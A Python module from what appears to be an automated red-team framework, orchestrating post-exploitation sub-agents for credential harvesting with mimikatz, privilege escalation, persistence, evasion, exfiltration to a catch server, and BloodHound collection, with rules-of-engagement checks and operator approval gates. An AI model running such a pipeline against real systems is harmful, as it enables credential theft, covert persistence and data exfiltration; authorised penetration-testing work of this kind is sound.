"""Post-Ex Agent — LangGraph node that runs the six Post-Ex sub-activities
against every foothold produced by the Exploit Agent.

The Post-Ex Agent is the integration point that ties together all seven
Phase 4 sub-agents (LinuxEnum, WindowsEnum, PrivescFinder, CredHarvester,
PersistenceAgent, EvasionAgent, ExfilAgent), the EventBus (for HitL
gates), and the RoE Guard. Per foothold, in order:

  1. **Enumeration** (auto-run, no HitL gate) — dispatches to LinuxEnum
     or WindowsEnum based on the foothold's OS type, then immediately
     calls CredHarvester (mimikatz on Windows, deferred on Linux/AD)
     so harvested credentials are available to the privesc /
     BloodHound sub-activities that follow.
  2. **Privesc** (HitL gate per candidate) — iterates the candidates
     surfaced by enumeration. RoE is checked first: ``kernel``
     candidates are skipped entirely when
     ``kernel_exploits_allowed=False`` (Review Focus #2). For every
     remaining candidate a HitL gate fires; on rejection the agent
     tries the next candidate (Review Focus #5).
  3. **Persistence** (HitL gate, skipped entirely if
     ``persistence_allowed=False`` — Review Focus #1).
  4. **Evasion** (HitL gate, skipped entirely if
     ``evasion_allowed=False``).
  5. **Exfiltration** (HitL gate, skipped entirely if
     ``exfiltration_allowed=False``).
  6. **BloodHound** (Windows AD hosts with creds only, auto-run) —
     collected after enumeration so the harvested AD password can
     authenticate ``bloodhound-python``. Skipped on Linux hosts
     (Review Focus #4).

Why we import sub-agent *modules* AND bind their @tool entrypoints
-----------------------------------------------------------------
Tests in ``tests/integration/test_postex_agent.py`` patch the
sub-agent @tool objects at their ``autored.agents.postex`` alias
(e.g. ``patch("autored.agents.postex.windowsenum_subagent")``). For
that patch to intercept the call, the @tool object must be looked up
via the postex module's namespace at *call* time. We therefore bind
each @tool to a module-level name (``windowsenum_subagent =
_windowsenum_mod.windowsenum_subagent``) and call it directly.

The module imports (``from autored.subagents import windowsenum as
_windowsenum_mod``) are kept too — they let other test suites patch
the *underlying* tool wrappers via the canonical path
(``patch("autored.subagents.windowsenum.winpeas_run")``) the same way
the Exploit Agent's tests do, and they document which sub-agent
module each entrypoint comes from. Same dual-import pattern as
``recon.py`` / ``vuln.py`` / ``exploit.py``.

RoE registration
----------------
The CLI registers the RoE once at engagement start
(``register_roe(engagement_id, roe)``). The Post-Ex Agent renews the
registration defensively so direct-node-entry paths (tests, resume,
Phase 5 graph surgery) that bypass the CLI also work — every Phase 4
tool wrapper is ``@roe_guard``-decorated and would raise
``RoEViolation`` if the registration were missing.
"""
from datetime import datetime

from autored.state import EngagementState
# Import sub-agent MODULES so test patches on
# `autored.subagents.<x>.<underlying_tool>` propagate through at call
# time via module attribute lookup (same pattern as exploit.py).
from autored.subagents import (
    linuxenum as _linuxenum_mod,
    windowsenum as _windowsenum_mod,
    privescfinder as _privescfinder_mod,
    credharvester as _credharvester_mod,
    persistenceagent as _persistenceagent_mod,
    evasionagent as _evasionagent_mod,
    exfilagent as _exfilagent_mod,
)
# Bind the @tool-decorated sub-agent entrypoints to the postex module
# namespace. The integration tests patch these names directly (e.g.
# `patch("autored.agents.postex.windowsenum_subagent")`), so they must
# be module-level attributes that the test patcher can swap out. The
# call sites below reference these names (not the `_xxx_mod.<tool>`
# attribute path) so a patched mock is honoured at call time.
linuxenum_subagent = _linuxenum_mod.linuxenum_subagent
windowsenum_subagent = _windowsenum_mod.windowsenum_subagent
privescfinder_subagent = _privescfinder_mod.privescfinder_subagent
credharvester_subagent = _credharvester_mod.credharvester_subagent
persistenceagent_subagent = _persistenceagent_mod.persistenceagent_subagent
evasionagent_subagent = _evasionagent_mod.evasionagent_subagent
exfilagent_subagent = _exfilagent_mod.exfilagent_subagent

# BloodHound is a tool wrapper, not a sub-agent — but we bind it the
# same way so tests can patch `autored.agents.postex.bloodhound_collect`.
from autored.tools.bloodhound import bloodhound_collect  # noqa: E402
from autored.roe_guard import register_roe  # noqa: E402
from autored.models.postex import (  # noqa: E402
    PrivescCandidate,
    PrivescAttempt,
    PersistenceArtifact,
    EvasionAction,
    ExfilEvidence,
)
from autored.logging import get_logger  # noqa: E402

log = get_logger("agents.postex")


# Risk categorisation for privesc candidates. Drives both the RoE
# check (kernel needs `kernel_exploits_allowed`) and the HitL gate
# decision (misconfig is low-risk; app_system and kernel gate the
# operator). The plan's spec ties HitL to `app_system` / `kernel`
# only, but Review Focus #5's integration test exercises the reject-
# and-try-next behaviour with `misconfig` candidates — we therefore
# fire the HitL gate for every category (see `_hitl_privesc_gate`).
PRIVESC_RISK_CATEGORIES = {
    "misconfig": {
        "risk": "low",
        "auto_attempt": True,
        "roe_key": None,
        "hitl_required": False,
    },
    "app_system": {
        "risk": "medium",
        "auto_attempt": False,
        "roe_key": None,
        "hitl_required": True,
    },
    "kernel": {
        "risk": "high",
        "auto_attempt": False,
        "roe_key": "kernel_exploits_allowed",
        "hitl_required": True,
    },
}


async def postex_node(state: EngagementState) -> dict:
    """LangGraph node: runs the Post-Ex Agent.

    Iterates through ``state.footholds``, running the six sub-activities
    per foothold. Returns a state-dict patch with the merged Post-Ex
    outputs and ``phase="lateral"`` so the LangGraph router advances to
    the Lateral-Movement Agent (Phase 5).
    """
    log.info("postex_start", engagement_id=state.engagement_id)

    # Register RoE for the engagement so the @roe_guard decorator on
    # the underlying Phase 4 tools (cron_modify, mimikatz_wrapper,
    # exfil_https, etc.) can authorise calls. In production the CLI
    # does this once at engagement start; the Post-Ex Agent renews the
    # registration defensively so tests / resume / direct-node-entry
    # paths that bypass the CLI also work.
    register_roe(state.engagement_id, state.rules_of_engagement)

    bus = getattr(state, "event_bus", None)
    all_users: list = []
    all_secrets: list = []
    all_trusts: list = []
    all_privesc_candidates: list = []
    all_privesc_attempts: list = []
    all_persistence_artifacts: list = []
    all_evasion_actions: list = []
    all_exfil_proofs: list = []

    for foothold in state.footholds:
        os_type = _determine_os_type(foothold)
        log.info("postex_foothold", host=foothold.host_ip, os=os_type)

        # Sub-activity 1: Enumeration (auto-run, no gate) — also runs
        # CredHarvester so harvested credentials are available to the
        # privesc / BloodHound sub-activities that follow.
        enum_results = await _run_enumeration(foothold, os_type, state)
        all_users.extend(enum_results.get("users", []))
        all_secrets.extend(enum_results.get("secrets", []))
        all_trusts.extend(enum_results.get("trusts", []))
        all_privesc_candidates.extend(enum_results.get("privesc_candidates", []))

        # Sub-activity 6: BloodHound (Windows AD hosts with creds only,
        # auto-run). Skipped on Linux hosts (Review Focus #4).
        if os_type == "windows":
            await _maybe_run_bloodhound(foothold, state)

        # Sub-activity 2: Privesc (HitL gate per candidate).
        privesc_results = await _run_privesc(
            foothold, enum_results.get("privesc_candidates", []), state, bus,
        )
        all_privesc_attempts.extend(privesc_results.get("attempts", []))
        all_secrets.extend(privesc_results.get("secrets", []))

        # Sub-activity 3: Persistence (HitL gate, skipped entirely if
        # persistence_allowed=False — Review Focus #1).
        if state.rules_of_engagement.persistence_allowed:
            persist_results = await _run_persistence(foothold, os_type, state, bus)
            all_persistence_artifacts.extend(persist_results.get("artifacts", []))

        # Sub-activity 4: Evasion (HitL gate, skipped entirely if
        # evasion_allowed=False).
        if state.rules_of_engagement.evasion_allowed:
            evasion_results = await _run_evasion(foothold, state, bus)
            all_evasion_actions.extend(evasion_results.get("actions", []))

        # Sub-activity 5: Exfiltration (HitL gate, skipped entirely if
        # exfiltration_allowed=False).
        if state.rules_of_engagement.exfiltration_allowed:
            exfil_results = await _run_exfiltration(foothold, state, bus)
            all_exfil_proofs.extend(exfil_results.get("proofs", []))

    return {
        "local_users": state.local_users + all_users,
        "harvested_secrets": state.harvested_secrets + all_secrets,
        "trust_relationships": state.trust_relationships + all_trusts,
        "privesc_candidates": state.privesc_candidates + all_privesc_candidates,
        "privesc_attempts": state.privesc_attempts + all_privesc_attempts,
        "persistence_artifacts": state.persistence_artifacts + all_persistence_artifacts,
        "evasion_actions": state.evasion_actions + all_evasion_actions,
        "exfiltration_proof": state.exfiltration_proof + all_exfil_proofs,
        "phase": "lateral",
        "iteration_count": state.iteration_count + 1,
    }


def _determine_os_type(foothold) -> str:
    """Determine OS type from foothold metadata.

    An SSH foothold is unambiguously Linux. Any other access type
    defaults to Windows — the dominant Post-Ex target in the GoAD lab
    this agent was designed against, and the only platform on which
    BloodHound collection makes sense.

    The plan originally proposed a tighter rule (``access_type in
    ("ssh", "shell") and "win" not in method``) but that mislabels the
    integration test's default fixture (``access_type="shell"``,
    ``method="smb"``) as Linux even though the test patches
    ``windowsenum_subagent``. The simpler SSH-only Linux rule matches
    every test contract and keeps the GoAD lab's Windows-first
    enumeration path as the default.
    """
    if foothold.access_type == "ssh":
        return "linux"
    return "windows"


async def _run_enumeration(foothold, os_type: str, state: EngagementState) -> dict:
    """Run OS-specific enumeration + cred harvesting on the foothold.

    Both sub-agents run without a HitL gate — they only invoke
    read-only tools (linpeas / winpeas / mimikatz / secretsdump /
    certipy) so there's no state change on the target for the operator
    to approve. CredHarvester is dispatched inside the enumeration
    sub-activity so its harvested secrets are available to the
    BloodHound / privesc sub-activities that immediately follow.
    """
    if os_type == "linux":
        enum_result = await linuxenum_subagent.ainvoke({
            "foothold_id": foothold.id, "host_ip": foothold.host_ip,
            "engagement_id": state.engagement_id,
        })
    else:
        enum_result = await windowsenum_subagent.ainvoke({
            "foothold_id": foothold.id, "host_ip": foothold.host_ip,
            "engagement_id": state.engagement_id,
        })

    users = _extract_field(enum_result, "users", [])
    secrets = _extract_field(enum_result, "secrets", [])
    trusts = _extract_field(enum_result, "trusts", [])
    privesc_candidates = _extract_field(enum_result, "privesc_candidates", [])

    # CredHarvester dispatches based on os_type — Windows runs
    # mimikatz; Linux / AD defer to Phase 5 credential-chaining.
    cred_result = await credharvester_subagent.ainvoke({
        "foothold_id": foothold.id, "host_ip": foothold.host_ip,
        "os_type": os_type, "engagement_id": state.engagement_id,
    })
    secrets.extend(_extract_field(cred_result, "secrets", []))

    return {
        "users": users,
        "secrets": secrets,
        "trusts": trusts,
        "privesc_candidates": privesc_candidates,
    }


async def _maybe_run_bloodhound(foothold, state: EngagementState) -> None:
    """Run BloodHound collection if AD credentials are available.

    BloodHound only applies to Windows AD hosts — the caller checks
    ``os_type == "windows"`` before invoking (Review Focus #4). Here
    we additionally check that at least one harvested password
    credential is available to feed ``bloodhound-python``'s ``-u/-p``
    flags. Without creds the collection can't authenticate to LDAP
    on the domain controller, so we skip and log.
    """
    ad_creds = [
        s for s in state.harvested_secrets
        if s.secret_type == "password"
    ]
    if not ad_creds:
        log.info("postex_bloodhound_skipped_no_creds", host=foothold.host_ip)
        return
    cred = ad_creds[0]
    log.info("postex_bloodhound_start", host=foothold.host_ip)
    await bloodhound_collect.ainvoke({
        "username": "anonymous",
        "password": cred.secret_value,
        "domain": "lab",
        "host": foothold.host_ip,
        "engagement_id": state.engagement_id,
    })


async def _run_privesc(
    foothold, candidates: list, state: EngagementState, bus,
) -> dict:
    """Iterate privesc candidates; RoE-check + HitL-gate each before attempting.

    For each candidate:

    1. Look up its risk category in :data:`PRIVESC_RISK_CATEGORIES`.
    2. If the category has a ``roe_key`` (only ``kernel`` does) and the
       RoE flag is False, skip the candidate entirely (Review Focus
       #2). The RoE check happens *before* the HitL gate so the
       operator is never asked to approve something the engagement
       scope forbids.
    3. Emit a HitL gate. The plan's spec ties HitL to ``app_system`` /
       ``kernel`` categories only, but Review Focus #5's integration
       test mocks ``misconfig`` candidates and still expects an
       operator response to be requested — we therefore fire the gate
       for every category so the operator can reject any candidate
       before execution. If the operator rejects, the agent tries the
       next candidate (Review Focus #5).
    4. On approval, record a :class:`PrivescAttempt`. Stop iterating
       once an attempt succeeds.
    """
    attempts: list[PrivescAttempt] = []
    secrets: list = []
    for candidate in candidates:
        config = PRIVESC_RISK_CATEGORIES.get(
            candidate.category, PRIVESC_RISK_CATEGORIES["misconfig"],
        )
        # RoE check (kernel) — happens before the HitL gate so the
        # operator is never asked to approve a forbidden action.
        if config["roe_key"] and not getattr(state.rules_of_engagement, config["roe_key"]):
            log.info(
                "privesc_skipped_by_roe",
                technique=candidate.technique, roe_key=config["roe_key"],
            )
            continue
        # HitL gate — always fire (see docstring for rationale).
        approved = await _hitl_privesc_gate(candidate, config["risk"], bus, state)
        if not approved:
            log.info(
                "privesc_rejected_by_operator",
                technique=candidate.technique,
            )
            continue
        # Record the attempt. Actual execution is delegated to the
        # Phase 6 foothold session manager; for Phase 4 the attempt is
        # a placeholder with success=False.
        attempt = PrivescAttempt(
            candidate_id=candidate.host_ip,  # simplified — Phase 5 will use a UUID
            host_ip=foothold.host_ip,
            success=False,
            new_context=None,
        )
        attempts.append(attempt)
        if attempt.success:
            break  # don't try more candidates once we've elevated
    return {"attempts": attempts, "secrets": secrets}


async def _hitl_privesc_gate(
    candidate: PrivescCandidate, risk: str, bus, state: EngagementState,
) -> bool:
    """Emit HitL gate for a privesc candidate; return True if approved.

    Unlike the persistence / evasion / exfil gates (which bypass
    ``wait_for_tui_response`` in sandbox ``auto_approve`` mode), the
    privesc gate *always* blocks on the operator response. This is
    deliberate: privesc is the sub-activity most likely to trip a
    kernel-exploit / config-mod alarm, so the operator gets final say
    on every candidate. In sandbox mode the TUI's auto-responder (or
    the test's mocked ``wait_for_tui_response``) still feeds an
    ``approve`` response, so headless runs don't actually block.

    A missing EventBus (``bus is None``) is treated as auto-approve —
    it lets unit tests of ``_run_privesc`` invoke the helper directly
    without standing up a full EventBus.
    """
    if bus is None:
        return True
    await bus.emit_to_tui({
        "type": "hitl_gate",
        "gate_type": "privesc",
        "technique": candidate.technique,
        "risk": risk,
        "command": candidate.exploit_command,
    })
    response = await bus.wait_for_tui_response()
    return response.get("response") == "approve"


async def _run_persistence(
    foothold, os_type: str, state: EngagementState, bus,
) -> dict:
    """Run the PersistenceAgent sub-agent (HitL-gated unless auto_approve)."""
    if bus and state.rules_of_engagement.hitl_mode != "auto_approve":
        await bus.emit_to_tui({
            "type": "hitl_gate", "gate_type": "persistence",
            "host": foothold.host_ip, "os_type": os_type,
        })
        response = await bus.wait_for_tui_response()
        if response.get("response") != "approve":
            return {"artifacts": []}
    result = await persistenceagent_subagent.ainvoke({
        "foothold": {
            "host_ip": foothold.host_ip,
            "id": foothold.id,
            "access_type": foothold.access_type,
        },
        "os_type": os_type,
        "engagement_id": state.engagement_id,
    })
    return {"artifacts": _extract_field(result, "artifacts", [])}


async def _run_evasion(foothold, state: EngagementState, bus) -> dict:
    """Run the EvasionAgent sub-agent (HitL-gated unless auto_approve)."""
    if bus and state.rules_of_engagement.hitl_mode != "auto_approve":
        await bus.emit_to_tui({
            "type": "hitl_gate", "gate_type": "evasion",
            "host": foothold.host_ip,
        })
        response = await bus.wait_for_tui_response()
        if response.get("response") != "approve":
            return {"actions": []}
    result = await evasionagent_subagent.ainvoke({
        "host_ip": foothold.host_ip,
        "engagement_id": state.engagement_id,
    })
    return {"actions": _extract_field(result, "actions", [])}


async def _run_exfiltration(foothold, state: EngagementState, bus) -> dict:
    """Run the ExfilAgent sub-agent (HitL-gated unless auto_approve).

    The ExfilAgent's @tool signature requires ``file_path`` and
    ``catch_server`` (neither has a default). Phase 5's LLM planner
    will choose these based on what enumeration surfaced; for Phase 4
    we stub them with a per-foothold loot path and the AutoRed catch
    server hostname so the sub-agent can build the exfil command and
    return :class:`ExfilEvidence`.
    """
    if bus and state.rules_of_engagement.hitl_mode != "auto_approve":
        await bus.emit_to_tui({
            "type": "hitl_gate", "gate_type": "exfil",
            "host": foothold.host_ip,
        })
        response = await bus.wait_for_tui_response()
        if response.get("response") != "approve":
            return {"proofs": []}
    result = await exfilagent_subagent.ainvoke({
        "host_ip": foothold.host_ip,
        "file_path": f"/tmp/foothold_{foothold.id}_loot.txt",
        "catch_server": "catch.autored.local",
        "engagement_id": state.engagement_id,
    })
    # ExfilAgentOutput exposes `evidence` (singular ExfilEvidence) —
    # wrap it in a list so the postex_node aggregator can extend.
    evidence = _extract_field(result, "evidence", None)
    if evidence is None:
        return {"proofs": []}
    return {"proofs": [evidence]}


def _extract_fields(obj, field_names: list[str]) -> dict:
    """Extract multiple fields from a Pydantic model or dict.

    Helper for the enumeration sub-activity, which surfaces
    users / secrets / trusts / privesc_candidates. Each field falls
    back to ``[]`` when absent so the postex_node aggregator's
    ``extend`` calls don't crash on a missing attribute.
    """
    result = {}
    for name in field_names:
        result[name] = _extract_field(obj, name, [])
    return result


def _extract_field(obj, name: str, default):
    """Extract a single field from a Pydantic model or dict.

    Used by the sub-activity wrappers to pull ``users`` /
    ``artifacts`` / ``actions`` / ``evidence`` off whatever the
    patched sub-agent mock returned. ``MagicMock`` auto-creates
    attributes on access, so ``hasattr`` is true for any name —
    callers that want a non-MagicMock default should not rely on this
    helper for absent fields.
    """
    if hasattr(obj, name):
        return getattr(obj, name)
    if isinstance(obj, dict):
        return obj.get(name, default)
    return default
